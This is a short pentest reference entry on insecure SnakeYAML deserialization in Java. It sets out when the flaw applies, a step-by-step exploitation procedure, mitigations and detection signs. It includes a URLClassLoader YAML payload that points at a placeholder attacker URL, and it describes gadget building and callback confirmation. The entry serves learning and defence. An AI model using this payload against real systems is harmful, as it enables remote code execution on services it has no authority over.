---
topic: Deserialización insegura con SnakeYAML
tags: [web, java, yaml, snakeyaml, deserialization, rce]
---

# Insecure Deserialization with SnakeYAML

**English** | [🇪🇸 Español](snakeyaml-deserialization.md)

## Concept

`SnakeYAML` can instantiate classes from `!!` tags in a YAML document. With the default constructor, untrusted input can create objects and execute code when the classpath offers a suitable gadget.

## When it applies

- User-supplied YAML configuration import.
- `new Yaml().load(input)` without `SafeConstructor`.
- Java applications whose dependencies include dangerous classes.

## Procedure

1. Confirm YAML is processed and errors mention SnakeYAML.
2. Try a harmless tag such as `!!java.util.Date`.
3. Enumerate classes available on the classpath.
4. Build a gadget with `URLClassLoader` or a class with a dangerous constructor.
5. Confirm execution with an HTTP/DNS callback.

```yaml
!!java.net.URLClassLoader [[!!java.net.URL ["http://<ATTACKER>/"]]]
```

## Variants

- `ScriptEngineManager` to load an engine and run code.
- Classes with setters that write files.
- Third-party library chains.

## Limitations

- `SafeConstructor` blocks tags.
- The classpath may lack the gadget.
- A sandbox or class filter prevents exploitation.

## Mitigation

- Use `SafeConstructor` and an allowlist of keys.
- Never accept user tags or types.
- Update SnakeYAML and review dependencies.
- Run the import with least privilege.

## Detection

- `!!` tags in requests.
- Class or constructor errors.
- Outbound connections during import.

## References

- <https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation>
- <https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data>
- <https://attack.mitre.org/techniques/T1059/007/>
